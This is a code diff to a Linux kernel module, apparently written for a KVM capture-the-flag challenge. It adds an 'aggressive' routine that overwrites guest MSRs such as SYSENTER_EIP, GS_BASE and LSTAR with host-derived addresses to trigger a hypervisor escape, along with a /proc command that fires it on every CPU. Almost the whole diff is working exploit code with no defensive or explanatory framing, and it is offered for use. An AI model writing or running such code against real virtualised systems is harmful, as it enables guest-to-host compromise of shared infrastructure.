@@ -86,6 +86,7 @@ static void msr_attack_on_cpu(void *info)
 	// === Phase 1: point MSRs at host-known addresses ===
 
 	// Try to set SYSENTER_ESP to host RSP (masked to trigger any sign-extension bug)
+	// Only modify one critical MSR at a time to prevent system freeze
 	val = host_rsp & 0x0000FFFFFFFFFFFFULL;
 	pr_info("[kvmctf_msr] CPU %d: setting SYSENTER_ESP to 0x%016llx\n",
 		cpu, val);
@@ -97,7 +98,46 @@ static void msr_attack_on_cpu(void *info)
 		cpu, val);
 	wrmsrl(MSR_IA32_SYSENTER_EIP, val);
 
-	// Try FS/GS/KERNEL_GS_BASE pointing at host GS area or flag region
+	// For other MSRs, we'll be more conservative - only set one for initial test
+	// Try GS_BASE pointing at flag region to start with
+	pr_info("[kvmctf_msr] CPU %d: setting GS_BASE to write_flag_va=0x%016llx\n",
+		cpu, write_flag_va);
+	wrmsrl(MSR_GS_BASE, write_flag_va);
+
+	pr_info("[kvmctf_msr] CPU %d: MSR attack done (no restore yet)\n", cpu);
+}
+
+// Aggressive version that sets more MSRs to trigger the vulnerability
+static void msr_aggressive_attack_on_cpu(void *info)
+{
+	int cpu = smp_processor_id();
+	struct msr_saved *s = &per_cpu_saved[cpu];
+	u64 val;
+
+	pr_info("[kvmctf_msr] CPU %d: starting AGGRESSIVE MSR attack\n", cpu);
+
+	// Save current values if not already saved
+	rdmsrl(MSR_IA32_SYSENTER_CS, s->sysenter_cs);
+	rdmsrl(MSR_IA32_SYSENTER_ESP, s->sysenter_esp);
+	rdmsrl(MSR_IA32_SYSENTER_EIP, s->sysenter_eip);
+	rdmsrl(MSR_FS_BASE, s->fs_base);
+	rdmsrl(MSR_GS_BASE, s->gs_base);
+	rdmsrl(MSR_KERNEL_GS_BASE, s->kernel_gs_base);
+	rdmsrl(MSR_LSTAR, s->lstar);
+
+	// Try to set SYSENTER_ESP to host RSP (masked to trigger any sign-extension bug)
+	val = host_rsp & 0x0000FFFFFFFFFFFFULL;
+	pr_info("[kvmctf_msr] CPU %d: setting SYSENTER_ESP to 0x%016llx\n",
+		cpu, val);
+	wrmsrl(MSR_IA32_SYSENTER_ESP, val);
+
+	// Try to set SYSENTER_EIP to host RIP (or gadget area)
+	val = host_rip & 0x0000FFFFFFFFFFFFULL;
+	pr_info("[kvmctf_msr] CPU %d: setting SYSENTER_EIP to 0x%016llx\n",
+		cpu, val);
+	wrmsrl(MSR_IA32_SYSENTER_EIP, val);
+
+	// Now set multiple MSRs to increase chances of triggering the vulnerability
 	pr_info("[kvmctf_msr] CPU %d: setting FS_BASE to host_gs_base=0x%016llx\n",
 		cpu, host_gs_base);
 	wrmsrl(MSR_FS_BASE, host_gs_base);
@@ -115,7 +155,7 @@ static void msr_attack_on_cpu(void *info)
 		cpu, host_kernel + 0x1000);
 	wrmsrl(MSR_LSTAR, host_kernel + 0x1000);
 
-	pr_info("[kvmctf_msr] CPU %d: MSR attack done (no restore yet)\n", cpu);
+	pr_info("[kvmctf_msr] CPU %d: AGGRESSIVE MSR attack done\n", cpu);
 }
 
 // Optional: restore original MSR state if you unload the module
@@ -156,6 +196,10 @@ static ssize_t proc_write(struct file *file, const char __user *buf,
 	} else if (strncmp(kbuf, "restore", 7) == 0) {
 		on_each_cpu(msr_restore_on_cpu, NULL, 1);
 		pr_info("[kvmctf_msr] restore triggered via /proc\n");
+	} else if (strncmp(kbuf, "aggressive", 8) == 0) {
+		// Aggressive mode - set more MSRs to try to trigger the vulnerability
+		on_each_cpu(msr_aggressive_attack_on_cpu, NULL, 1);
+		pr_info("[kvmctf_msr] aggressive attack triggered via /proc\n");
 	} else {
 		pr_info("[kvmctf_msr] unknown command in /proc: %s\n", kbuf);
 	}
